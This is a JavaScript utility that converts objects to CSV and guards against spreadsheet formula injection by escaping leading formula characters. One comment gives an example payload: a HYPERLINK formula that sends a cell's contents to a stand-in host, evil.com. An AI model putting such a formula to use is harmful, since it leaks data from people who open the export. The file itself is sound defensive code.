/**
 * Converts an array of objects into a CSV string.
 *
 * @param {Array<object>} rows
 * @param {Array<{key: string, label: string}>} columns - defines column
 *   order and header text; `key` supports dot-paths (e.g. "user.name").
 */
function toCsv(rows, columns) {
  // Characters that Excel/Sheets treat as the start of a formula when a
  // cell's content begins with them. A user's name, phone, or a pickup's
  // address is attacker-controlled free text that ends up in these exports
  // — without neutralizing this, someone could register with a name like
  // `=HYPERLINK("http://evil.com/steal?"&A1,"click")` and have it execute
  // the moment an admin opens the CSV in a spreadsheet app. This is the
  // standard OWASP-recommended mitigation: prefix with a single quote,
  // which spreadsheet apps render as literal text instead of evaluating.
  const FORMULA_PREFIXES = ["=", "+", "-", "@", "\t", "\r"];

  const escape = (value) => {
    if (value === null || value === undefined) return "";
    let str = String(value);

    if (FORMULA_PREFIXES.some((prefix) => str.startsWith(prefix))) {
      str = `'${str}`;
    }

    // Quote (and escape internal quotes) any field containing a comma,
    // quote, or newline — otherwise those characters would corrupt the
    // column structure when opened in Excel/Sheets.
    if (/[",\n\r]/.test(str)) {
      return `"${str.replace(/"/g, '""')}"`;
    }
    return str;
  };

  const getPath = (obj, path) =>
    path.split(".").reduce((acc, key) => (acc == null ? acc : acc[key]), obj);

  const header = columns.map((c) => escape(c.label)).join(",");
  const lines = rows.map((row) =>
    columns.map((c) => escape(getPath(row, c.key))).join(",")
  );

  // \r\n per RFC 4180 — Excel in particular is picky about this on Windows.
  return [header, ...lines].join("\r\n");
}

module.exports = toCsv;